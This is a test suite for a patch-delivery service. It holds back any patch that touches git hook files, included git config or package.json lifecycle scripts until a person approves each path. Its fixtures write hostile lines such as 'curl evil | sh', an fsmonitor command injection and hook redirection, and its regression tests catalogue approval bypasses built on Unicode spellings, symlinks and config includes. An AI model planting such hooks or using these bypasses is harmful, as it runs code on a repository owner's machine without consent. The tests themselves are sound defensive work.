// A `local` patch that touches the target repository's hook files, end to end through the service
// surface against real repositories: the pre-check route names them before anyone approves, and
// the delivery — the boundary — writes nothing until the submission carries every one of them in
// `approvedHookPaths`. A hook added and reverted inside the patch still counts.

import { test } from "bun:test";
import { mkdir, mkdtemp, realpath, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { assert, assertEquals, assertStringIncludes } from "@std/assert";
import { type AppDeps, makeHandler } from "../src/http/app.ts";
import { localFsRepoCache } from "../src/adapters/repo_cache/local_fs.ts";
import { localFsPatchStore } from "../src/adapters/patch_store/local_fs.ts";
import { localForgeApi } from "../src/adapters/forge_api/local.ts";
import { localChangeTransport } from "../src/adapters/change_transport/local.ts";
import { providerRegistry } from "../src/ports/forge_api.ts";
import { git } from "../src/helpers/git_exec.ts";
import { SubmitRequestSchema } from "../src/schema.ts";
import { commit, makeUpstream, silentDiagnostics } from "./util.ts";

const SERVICE_TOKEN = "service-secret";
const REPO = "cr-local";
const RUN = "run-1";
const BRANCH = "ryph/ada/r-1/work";

/** `<tmp>/root/repo` with `main` checked out, the service over it, and a workspace clone the
 * "run" commits in; `patch` files the bundle of whatever the workspace's branch now holds. */
async function world(over: Partial<AppDeps> = {}) {
  const tmp = await realpath(await mkdtemp(join(tmpdir(), "ryph-")));
  const root = `${tmp}/root`;
  const repo = `${root}/repo`;
  const baseOf = { sha: await makeUpstream(repo) };
  // Explicit, so the answer does not depend on the filesystem the test runs on.
  await git(repo, "config", "core.ignorecase", "false");
  const diag = silentDiagnostics();
  const stagingDir = `${tmp}/staging`;
  await mkdir(stagingDir, { recursive: true });
  const cache = localFsRepoCache({ root: `${tmp}/cache`, diag });
  const patches = localFsPatchStore(`${tmp}/patches`, diag);
  const deps: AppDeps = {
    keys: { resolve: () => Promise.resolve(null) },
    cache,
    patches,
    diag,
    forges: providerRegistry({ local: localForgeApi({ root }) }, "forge API"),
    transports: providerRegistry(
      { local: localChangeTransport({ root, cache, diag }) },
      "change transport",
    ),
    localRoot: root,
    serviceToken: SERVICE_TOKEN,
    config: { maxUploadPackBytes: 1024 * 1024, maxBundleBytes: 1024 * 1024, stagingDir },
    ...over,
  };
  const handler = makeHandler(deps);
  const ws = `${tmp}/ws`;
  await mkdir(ws);
  await git(ws, "clone", "--quiet", "--", repo, ".");
  await git(ws, "checkout", "--quiet", "-b", BRANCH);
  let n = 0;

  /** One commit in the workspace: `write` files (null removes one, `{ link }` makes a symlink). */
  const change = async (files: Record<string, string | null | { link: string }>) => {
    for (const [path, text] of Object.entries(files)) {
      if (text === null) {
        await git(ws, "rm", "--quiet", "-r", "--", path);
        continue;
      }
      await mkdir(`${ws}/${path}`.replace(/\/[^/]*$/, ""), { recursive: true });
      if (typeof text === "string") await writeFile(`${ws}/${path}`, text);
      else await symlink(text.link, `${ws}/${path}`);
    }
    await git(ws, "add", "-A");
    n += 1;
    await commit(ws, `change ${n}`);
  };

  /** The workspace's branch, bundled from the base and filed as intake files it. */
  const patch = async () => {
    const headSha = await git(ws, "rev-parse", "HEAD");
    const bundlePath = `${tmp}/b-${headSha}.bundle`;
    await git(ws, "bundle", "create", bundlePath, `${baseOf.sha}..refs/heads/${BRANCH}`);
    const bundleKey = `${RUN}/${REPO}/${headSha}.bundle`;
    await patches.put(bundleKey, bundlePath);
    return { headSha, bundleKey };
  };

  const post = (path: string, body: unknown, token: string | null = SERVICE_TOKEN) =>
    handler(
      new Request(`http://forge${path}`, {
        method: "POST",
        headers: {
          "content-type": "application/json",
          ...(token === null ? {} : { authorization: `Bearer ${token}` }),
        },
        body: JSON.stringify(body),
      }),
    );

  const localRepo = { provider: "local", repoRef: repo, tenantId: null };
  const hooksOf = (p: { headSha: string; bundleKey: string }, over: Record<string, unknown> = {}) =>
    post("/v1/service/local/patch-hooks", {
      repo: localRepo,
      url: repo,
      connectedRepoId: REPO,
      bundleKey: p.bundleKey,
      branchName: BRANCH,
      headSha: p.headSha,
      baseSha: null,
      targetRef: "main",
      mode: "live",
      ...over,
    });
  const submit = (
    p: { headSha: string; bundleKey: string },
    over: Record<string, unknown> = {},
  ) =>
    post("/v1/service/submit", {
      bundleKey: p.bundleKey,
      branchName: BRANCH,
      headSha: p.headSha,
      repo: localRepo,
      repoUrl: repo,
      baseBranch: "main",
      title: "the work",
      body: "",
      ...over,
    });

  /** One commit straight on the repository's `main` (the owner's own work), before the
   * workspace branches off it: the workspace is re-based onto it. */
  const ownerCommit = async (files: Record<string, string | { link: string }>) => {
    for (const [path, text] of Object.entries(files)) {
      await mkdir(`${repo}/${path}`.replace(/\/[^/]*$/, ""), { recursive: true });
      if (typeof text === "string") await writeFile(`${repo}/${path}`, text);
      else await symlink(text.link, `${repo}/${path}`);
    }
    await git(repo, "add", "-A");
    await commit(repo, "owner's work");
    await git(ws, "fetch", "--quiet", "origin", "main");
    await git(ws, "reset", "--quiet", "--hard", "origin/main");
    baseOf.sha = await git(repo, "rev-parse", "HEAD");
  };

  return {
    tmp,
    repo,
    ws,
    ownerCommit,
    change,
    patch,
    post,
    hooksOf,
    submit,
    tipOf: (branch: string) =>
      git(repo, "rev-parse", "--verify", "--quiet", `refs/heads/${branch}`).catch(() => null),
    cleanup: () => rm(tmp, { recursive: true }),
  };
}

test("patch-hooks: the hook files a patch touches, the folders looked at, sorted and deduped", async () => {
  const w = await world();
  try {
    await git(w.repo, "config", "core.hooksPath", "tools/hooks");
    await w.change({
      ".husky/post-checkout": "#!/bin/sh\n",
      "tools/hooks/pre-push": "#!/bin/sh\n",
      "packages/app/.lintstagedrc.json": "{}\n",
      "src/index.ts": "x\n",
    });
    const res = await w.hooksOf(await w.patch());
    assertEquals(res.status, 200);
    assertEquals(await res.json(), {
      touched: [".husky/post-checkout", "packages/app/.lintstagedrc.json", "tools/hooks/pre-push"],
      hooksPaths: [
        ".husky",
        ".githooks",
        ".config/husky",
        ".lefthook",
        ".lefthook-local",
        "tools/hooks",
      ],
      more: false,
    });
  } finally {
    await w.cleanup();
  }
});

test("patch-hooks: a hook added and reverted inside the patch is still named", async () => {
  const w = await world();
  try {
    await w.change({ ".githooks/post-checkout": "#!/bin/sh\ncurl evil | sh\n", "a.txt": "a\n" });
    await w.change({ ".githooks/post-checkout": null });
    const res = await w.hooksOf(await w.patch());
    assertEquals((await res.json()).touched, [".githooks/post-checkout"]);
  } finally {
    await w.cleanup();
  }
});

test("patch-hooks: a patch touching no hook file answers an empty list; past the cap, `more`", async () => {
  const w = await world();
  try {
    await w.change({ "src/a.ts": "a\n" });
    assertEquals(await (await w.hooksOf(await w.patch())).json(), {
      touched: [],
      hooksPaths: [".husky", ".githooks", ".config/husky", ".lefthook", ".lefthook-local"],
      more: false,
    });
    const many: Record<string, string> = {};
    for (let i = 0; i < 60; i++) many[`.husky/h${String(i).padStart(2, "0")}`] = "#!/bin/sh\n";
    await w.change(many);
    const cut = await (await w.hooksOf(await w.patch())).json();
    assertEquals(cut.touched.length, 50);
    assertEquals(cut.touched[0], ".husky/h00");
    assertEquals(cut.more, true);
  } finally {
    await w.cleanup();
  }
});

test("patch-hooks: service token only; a repository not on this machine is 422; live mode only", async () => {
  const w = await world();
  try {
    await w.change({ "a.txt": "a\n" });
    const p = await w.patch();
    assertEquals(await w.hooksOf(p, {}).then((r) => r.status), 200);
    const bare = await w.post("/v1/service/local/patch-hooks", {}, null);
    assertEquals(bare.status, 401);
    const wrong = await w.post("/v1/service/local/patch-hooks", {}, "nope");
    assertEquals(wrong.status, 401);
    const github = await w.hooksOf(p, {
      repo: { provider: "github", repoRef: "acme/app", tenantId: "7" },
      url: "https://github.com/acme/app.git",
    });
    assertEquals(github.status, 422);
    assertStringIncludes((await github.json()).error, "on this machine");
    const record = await w.hooksOf(p, { mode: "record" });
    assertEquals(record.status, 400);
    assertEquals((await record.json()).terminal, true);
    // The key must be this repo's head, as for the diff.
    const other = await w.hooksOf(p, { headSha: "f".repeat(40) });
    assertEquals(other.status, 400);
  } finally {
    await w.cleanup();
  }
});

test("delivery: an unapproved hook file is held — 409 needs_approval, and no branch is created", async () => {
  const w = await world();
  try {
    await w.change({ ".husky/post-checkout": "#!/bin/sh\n", "lefthook.yml": "x: 1\n" });
    const p = await w.patch();
    const held = await w.submit(p);
    assertEquals(held.status, 409);
    assertEquals(await held.json(), {
      code: "needs_approval",
      touched: [".husky/post-checkout", "lefthook.yml"],
      hooksPaths: [".husky", ".githooks", ".config/husky", ".lefthook", ".lefthook-local"],
      more: false,
    });
    assertEquals(await w.tipOf(BRANCH), null);

    // Approving some of them is approving none of the rest.
    const partly = await w.submit(p, { approvedHookPaths: [".husky/post-checkout"] });
    assertEquals(partly.status, 409);
    assertEquals(await w.tipOf(BRANCH), null);
    // Matched exactly: a different spelling is not the file the person saw.
    const respelled = await w.submit(p, {
      approvedHookPaths: ["./.husky/post-checkout", "LEFTHOOK.yml"],
    });
    assertEquals(respelled.status, 409);

    // Every file the person was shown: delivered.
    const approved = await w.submit(p, {
      approvedHookPaths: [".husky/post-checkout", "lefthook.yml"],
    });
    assertEquals(approved.status, 201);
    assertEquals(await approved.json(), { ref: BRANCH, url: null });
    assertEquals(await w.tipOf(BRANCH), p.headSha);
  } finally {
    await w.cleanup();
  }
});

test("delivery: a revision touching a hook file the approval did not name is held again", async () => {
  const w = await world();
  try {
    await w.change({ ".husky/pre-commit": "#!/bin/sh\n" });
    const first = await w.patch();
    const approved = [".husky/pre-commit"];
    assertEquals((await w.submit(first, { approvedHookPaths: approved })).status, 201);

    await w.change({ ".husky/post-checkout": "#!/bin/sh\ncurl evil | sh\n" });
    const second = await w.patch();
    const held = await w.submit(second, { changeRequest: BRANCH, approvedHookPaths: approved });
    assertEquals(held.status, 409);
    const body = await held.json();
    assertEquals(body.touched, [".husky/post-checkout", ".husky/pre-commit"]);
    assertEquals(await w.tipOf(BRANCH), first.headSha);

    const both = await w.submit(second, {
      changeRequest: BRANCH,
      approvedHookPaths: body.touched,
    });
    assertEquals(both.status, 201);
    assertEquals(await w.tipOf(BRANCH), second.headSha);
  } finally {
    await w.cleanup();
  }
});

test("delivery: a patch touching no hook file is delivered as before, with nothing approved", async () => {
  const w = await world();
  try {
    await w.change({ "src/a.ts": "a\n", "docs/husky.md": "not a hook\n" });
    const p = await w.patch();
    const res = await w.submit(p);
    assertEquals(res.status, 201);
    assertEquals(await w.tipOf(BRANCH), p.headSha);
  } finally {
    await w.cleanup();
  }
});

test("delivery: .Husky is .husky whatever the repository's core.ignorecase says", async () => {
  const w = await world();
  try {
    await w.change({ ".Husky/post-checkout": "#!/bin/sh\n" });
    const p = await w.patch();
    // world() says the repository is case-sensitive; the disk underneath may not be, and the
    // config does not decide what the disk does.
    assertEquals((await w.hooksOf(p).then((r) => r.json())).touched, [".Husky/post-checkout"]);
    const held = await w.submit(p);
    assertEquals(held.status, 409);
    assertEquals((await held.json()).touched, [".Husky/post-checkout"]);
    assertEquals(await w.tipOf(BRANCH), null);
  } finally {
    await w.cleanup();
  }
});

test("delivery: a hook added and reverted inside the patch is held too", async () => {
  const w = await world();
  try {
    await w.change({ ".githooks/post-checkout": "#!/bin/sh\n", "a.txt": "a\n" });
    await w.change({ ".githooks/post-checkout": null });
    const p = await w.patch();
    const held = await w.submit(p);
    assertEquals(held.status, 409);
    assertEquals((await held.json()).touched, [".githooks/post-checkout"]);
    assertEquals(await w.tipOf(BRANCH), null);
  } finally {
    await w.cleanup();
  }
});

test("the wire: approvedHookPaths defaults to none, and is bounded", () => {
  const base = {
    bundleKey: `${RUN}/${REPO}/${"a".repeat(40)}.bundle`,
    branchName: BRANCH,
    headSha: "a".repeat(40),
    repo: { provider: "github", repoRef: "acme/app", tenantId: "7" },
    repoUrl: "https://github.com/acme/app.git",
    baseBranch: "main",
    title: "t",
    body: "",
  };
  const parsed = SubmitRequestSchema.safeParse(base);
  assert(parsed.success);
  assertEquals(parsed.data.approvedHookPaths, []);
  assert(SubmitRequestSchema.safeParse({ ...base, approvedHookPaths: [".husky/x"] }).success);
  assert(!SubmitRequestSchema.safeParse({ ...base, approvedHookPaths: [""] }).success);
  assert(
    !SubmitRequestSchema.safeParse({ ...base, approvedHookPaths: ["x".repeat(4097)] }).success,
  );
  assert(
    !SubmitRequestSchema.safeParse({
      ...base,
      approvedHookPaths: Array.from({ length: 1001 }, (_, i) => `.husky/${i}`),
    }).success,
  );
});

// ---- regressions: each a bypass the review proved against the gate ---------------------------

/** A run's patch that would have run `mark`'s hook on the owner's checkout: held, nothing
 * written, and `touched` names at least `expected`. */
async function assertHeld(
  w: Awaited<ReturnType<typeof world>>,
  expected: string[],
) {
  const p = await w.patch();
  const pre = await w.hooksOf(p);
  assertEquals(pre.status, 200);
  const preBody = await pre.json();
  for (const path of expected) assert(preBody.touched.includes(path), `pre-check: ${path}`);
  const held = await w.submit(p);
  assertEquals(held.status, 409);
  const body = await held.json();
  assertEquals(body.code, "needs_approval");
  for (const path of expected) assert(body.touched.includes(path), `delivery: ${path}`);
  assertEquals(await w.tipOf(BRANCH), null);
  // Approved with exactly what it named: delivered.
  assertEquals((await w.submit(p, { approvedHookPaths: body.touched })).status, 201);
}

test("regression F1+F2: .huſky (long s) and .HUSKY are .husky — folded even under core.ignorecase=false", async () => {
  for (const spelling of [".huſky", ".HUSKY", ".lintﬆagedrc"]) {
    const w = await world();
    try {
      // world() sets core.ignorecase=false, as a repository copied onto this Mac can carry.
      await git(w.repo, "config", "core.hooksPath", ".husky");
      const path = spelling.startsWith(".lint") ? spelling : `${spelling}/post-checkout`;
      await w.change({ [path]: "#!/bin/sh\ncurl evil | sh\n" });
      await assertHeld(w, [path]);
    } finally {
      await w.cleanup();
    }
  }
});

test("regression F3: a symlink at an ANCESTOR of the hook folder, added by the patch", async () => {
  const w = await world();
  try {
    await git(w.repo, "config", "core.hooksPath", "tools/hooks");
    await w.change({ "tools": { link: "evil" }, "evil/hooks/post-checkout": "#!/bin/sh\n" });
    await assertHeld(w, ["tools", "evil/hooks/post-checkout"]);
  } finally {
    await w.cleanup();
  }
});

test("regression F3: a TRACKED symlink at an ancestor of the hook folder, and files added where it points", async () => {
  const w = await world();
  try {
    await w.ownerCommit({ "vendor/tools/README": "x\n", "tools": { link: "vendor/tools" } });
    await git(w.repo, "config", "core.hooksPath", "tools/hooks");
    // The owner is working on a branch without the link: the disk cannot say where `tools`
    // leads, only `main`'s tree — the one the delivered branch is checked out from — can.
    await git(w.repo, "checkout", "--quiet", "-b", "owner-wip", "HEAD~1");
    await w.change({ "vendor/tools/hooks/post-checkout": "#!/bin/sh\n" });
    await assertHeld(w, ["vendor/tools/hooks/post-checkout"]);
  } finally {
    await w.cleanup();
  }
});

test("regression F4: a tracked file the repository's config includes is a hook file", async () => {
  const w = await world();
  try {
    await w.ownerCommit({ ".gitconfig": "[pull]\n\trebase = true\n" });
    await git(w.repo, "config", "include.path", "../.gitconfig");
    await w.change({ ".gitconfig": '[core]\n\tfsmonitor = "touch /tmp/pwned; false"\n' });
    await assertHeld(w, [".gitconfig"]);
  } finally {
    await w.cleanup();
  }
});

test("regression F4: a conditional include of a file not there yet — onbranch holds on the delivered branch", async () => {
  const w = await world();
  try {
    await git(w.repo, "config", "includeIf.onbranch:ryph/**.path", "../.gitconfig.local");
    await w.change({ ".gitconfig.local": "[core]\n\thooksPath = h\n", "h/post-checkout": "x\n" });
    await assertHeld(w, [".gitconfig.local"]);
  } finally {
    await w.cleanup();
  }
});

test("regression F5a: the script a hook symlink points at is a hook file", async () => {
  const w = await world();
  try {
    await w.ownerCommit({
      "scripts/pc.sh": "#!/bin/sh\nexit 0\n",
      ".husky/post-checkout": { link: "../scripts/pc.sh" },
    });
    await git(w.repo, "config", "core.hooksPath", ".husky");
    await w.change({ "scripts/pc.sh": "#!/bin/sh\ncurl evil | sh\n" });
    await assertHeld(w, ["scripts/pc.sh"]);
  } finally {
    await w.cleanup();
  }
});

test("regression F5c: the root package.json is held only when its hook keys change", async () => {
  const w = await world();
  try {
    const pkg = (o: Record<string, unknown>) => JSON.stringify({ name: "app", ...o }, null, 2);
    await w.ownerCommit({ "package.json": pkg({ scripts: { test: "deno test" } }) });
    // Any other key: delivered as before.
    await w.change({ "package.json": pkg({ version: "2.0.0", scripts: { test: "vitest" } }) });
    const plain = await w.patch();
    assertEquals((await (await w.hooksOf(plain)).json()).touched, []);
    // A lifecycle script, then reverted in the next commit: held all the same.
    await w.change({
      "package.json": pkg({ scripts: { test: "vitest", postinstall: "curl evil | sh" } }),
    });
    await w.change({ "package.json": pkg({ version: "2.0.0", scripts: { test: "vitest" } }) });
    await assertHeld(w, ["package.json"]);
  } finally {
    await w.cleanup();
  }
});

test("regression F5c: a husky key added to package.json is held", async () => {
  const w = await world();
  try {
    await w.ownerCommit({ "package.json": '{ "name": "app" }\n' });
    await w.change({
      "package.json": '{ "name": "app", "simple-git-hooks": { "post-checkout": "x" } }\n',
    });
    await assertHeld(w, ["package.json"]);
  } finally {
    await w.cleanup();
  }
});

test('regression: core.hooksPath=. is spelled "." on the wire, never ""', async () => {
  const w = await world();
  try {
    await git(w.repo, "config", "core.hooksPath", ".");
    await w.change({ "post-checkout": "#!/bin/sh\n" });
    const p = await w.patch();
    const pre = await (await w.hooksOf(p)).json();
    assertEquals(pre.hooksPaths, [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
      ".",
    ]);
    assertEquals(pre.touched, ["post-checkout"]);
    const held = await w.submit(p);
    assertEquals(held.status, 409);
    const body = await held.json();
    assertEquals(body.hooksPaths, [
      ".husky",
      ".githooks",
      ".config/husky",
      ".lefthook",
      ".lefthook-local",
      ".",
    ]);
    assert(!body.hooksPaths.includes(""));
  } finally {
    await w.cleanup();
  }
});

test("regression: every patch-hooks failure says whether it is terminal", async () => {
  const w = await world();
  try {
    await w.change({ "a.txt": "a\n" });
    const p = await w.patch();
    const unauthorized = await w.post("/v1/service/local/patch-hooks", {}, null);
    assertEquals(unauthorized.status, 401);
    assertEquals((await unauthorized.json()).terminal, false);
    const github = await w.hooksOf(p, {
      repo: { provider: "github", repoRef: "acme/app", tenantId: "7" },
      url: "https://github.com/acme/app.git",
    });
    assertEquals(github.status, 422);
    assertEquals((await github.json()).terminal, true);
    const gone = await w.hooksOf({ ...p, bundleKey: `${RUN}/x/${REPO}/${p.headSha}.bundle` });
    assertEquals(gone.status, 410);
    assertEquals((await gone.json()).terminal, true);
    const noBranch = await w.hooksOf(p, { targetRef: "deleted-branch" });
    assertEquals(noBranch.status, 409);
    assertEquals((await noBranch.json()).terminal, true);
  } finally {
    await w.cleanup();
  }
});

test("regression: an unexpected throw in patch-hooks is a 500 that still says terminal: false", async () => {
  // No forge serves `local` here, so looking up the repository's upstream throws.
  const w = await world({ forges: providerRegistry({}, "forge API") });
  try {
    await w.change({ "a.txt": "a\n" });
    const res = await w.hooksOf(await w.patch());
    assertEquals(res.status, 500);
    assertEquals(await res.json(), {
      error: "could not check the patch for hook files",
      terminal: false,
    });
  } finally {
    await w.cleanup();
  }
});

test("regression H9: husky v9 set up in a subfolder — `<dir>/_` configured holds `<dir>/<hook>`", async () => {
  for (const dir of ["frontend/.husky", "web/hooks"]) {
    const w = await world();
    try {
      await w.ownerCommit({ [`${dir}/pre-commit`]: "npm test\n" });
      await git(w.repo, "config", "core.hooksPath", `${dir}/_`);
      await w.change({ [`${dir}/post-checkout`]: "#!/bin/sh\ncurl evil | sh\n" });
      const p = await w.patch();
      const pre = await (await w.hooksOf(p)).json();
      assertEquals(pre.touched, [`${dir}/post-checkout`], dir);
      assert(pre.hooksPaths.includes(dir), pre.hooksPaths.join(","));
      assertEquals((await w.submit(p)).status, 409, dir);
      assertEquals(await w.tipOf(BRANCH), null);
    } finally {
      await w.cleanup();
    }
  }
});

test("regression T4: core.hooksPath=scripts/../.hk — a patch turning `scripts` into a link is held", async () => {
  const w = await world();
  try {
    await w.ownerCommit({ "scripts/x.sh": "x\n" });
    await git(w.repo, "config", "core.hooksPath", "scripts/../.hk");
    await w.change({ "scripts": null });
    await w.change({
      "scripts": { link: "a/b" },
      "a/b/x": "x\n",
      "a/.hk/post-checkout": "#!/bin/sh\ncurl evil | sh\n",
    });
    const p = await w.patch();
    const pre = await (await w.hooksOf(p)).json();
    assert(pre.touched.includes("scripts"), pre.touched.join(","));
    assertEquals((await w.submit(p)).status, 409);
    // Editing what is under `scripts` is not editing a hook.
    const plain = await world();
    try {
      await plain.ownerCommit({ "scripts/x.sh": "x\n" });
      await git(plain.repo, "config", "core.hooksPath", "scripts/../.hk");
      await plain.change({ "scripts/x.sh": "y\n" });
      assertEquals((await (await plain.hooksOf(await plain.patch())).json()).touched, []);
    } finally {
      await plain.cleanup();
    }
  } finally {
    await w.cleanup();
  }
});

test("regression T11: a root package.json that is a symlink — what it leads to is held whole", async () => {
  const w = await world();
  try {
    await w.ownerCommit({
      "pkg/real.json": JSON.stringify({ name: "x", scripts: { prepare: "echo ok" } }),
      "package.json": { link: "pkg/real.json" },
    });
    await w.change({
      "pkg/real.json": JSON.stringify({ name: "x", scripts: { prepare: "curl evil | sh" } }),
    });
    const p = await w.patch();
    assertEquals((await (await w.hooksOf(p)).json()).touched, ["pkg/real.json"]);
    assertEquals((await w.submit(p)).status, 409);
  } finally {
    await w.cleanup();
  }
});

test("regression T11: a patch that turns the root package.json into a symlink is held", async () => {
  const w = await world();
  try {
    const text = JSON.stringify({ name: "x", scripts: { prepare: "echo ok" } });
    await w.ownerCommit({ "package.json": text });
    await w.change({ "package.json": null });
    await w.change({ "elsewhere.json": text, "package.json": { link: "elsewhere.json" } });
    const touched = (await (await w.hooksOf(await w.patch())).json()).touched;
    assertEquals(touched, ["elsewhere.json", "package.json"]);
  } finally {
    await w.cleanup();
  }
});

test("regression T12: a root package.yaml is held on any change; install-time config is not", async () => {
  const w = await world();
  try {
    await w.change({
      "package.yaml": "lint-staged:\n  '*': curl evil | sh\n",
      ".config/commitlintrc.js": "module.exports = {}\n",
      ".yarnrc.yml": "yarnPath: ./evil.cjs\n",
      ".npmrc": "node-options=--require ./evil.js\n",
    });
    assertEquals((await (await w.hooksOf(await w.patch())).json()).touched, [
      ".config/commitlintrc.js",
      "package.yaml",
    ]);
  } finally {
    await w.cleanup();
  }
});

test("regression N1: core.hooksPath=scripts/../.hk with `scripts` ALREADY a tracked link — the link's parent holds the hooks", async () => {
  // git (the kernel) follows `scripts -> a/b` BEFORE the `..`: the hooks are in `a/.hk`.
  for (const ownerOnBase of [true, false]) {
    const w = await world();
    try {
      await w.ownerCommit({ "a/b/x.sh": "x\n", "scripts": { link: "a/b" } });
      await git(w.repo, "config", "core.hooksPath", "scripts/../.hk");
      // Off the base, the disk has no link: only the base's tree says where `scripts` leads.
      if (!ownerOnBase) await git(w.repo, "checkout", "--quiet", "-b", "owner-wip", "HEAD~1");
      await w.change({ "a/.hk/post-checkout": "#!/bin/sh\ncurl evil | sh\n" });
      await assertHeld(w, ["a/.hk/post-checkout"]);
    } finally {
      await w.cleanup();
    }
  }
  // `.hk` as written is not where the hooks are.
  const plain = await world();
  try {
    await plain.ownerCommit({ "a/b/x.sh": "x\n", "scripts": { link: "a/b" } });
    await git(plain.repo, "config", "core.hooksPath", "scripts/../.hk");
    await plain.change({ ".hk/post-checkout": "x\n" });
    assertEquals((await (await plain.hooksOf(await plain.patch())).json()).touched, []);
  } finally {
    await plain.cleanup();
  }
});

test("regression N2: core.hooksPath=scripts/../.hk with `scripts` the owner's UNTRACKED link", async () => {
  const w = await world();
  try {
    await w.ownerCommit({ "a/b/x.sh": "x\n" });
    await symlink("a/b", `${w.repo}/scripts`);
    await writeFile(`${w.repo}/.git/info/exclude`, "scripts\n");
    await git(w.repo, "config", "core.hooksPath", "scripts/../.hk");
    await w.change({ "a/.hk/post-checkout": "#!/bin/sh\ncurl evil | sh\n" });
    await assertHeld(w, ["a/.hk/post-checkout"]);
  } finally {
    await w.cleanup();
  }
});

test("regression N4: include.path=../scripts/../x.cfg with `scripts` a tracked link — git reads a/x.cfg", async () => {
  for (const ownerOnBase of [true, false]) {
    const w = await world();
    try {
      await w.ownerCommit({
        "a/x.cfg": "[user]\n\tname = ok\n",
        "a/b/y": "y\n",
        "scripts": { link: "a/b" },
      });
      await git(w.repo, "config", "include.path", "../scripts/../x.cfg");
      if (!ownerOnBase) await git(w.repo, "checkout", "--quiet", "-b", "owner-wip", "HEAD~1");
      await w.change({ "a/x.cfg": "[core]\n\thooksPath = evilhooks\n" });
      await assertHeld(w, ["a/x.cfg"]);
    } finally {
      await w.cleanup();
    }
  }
});
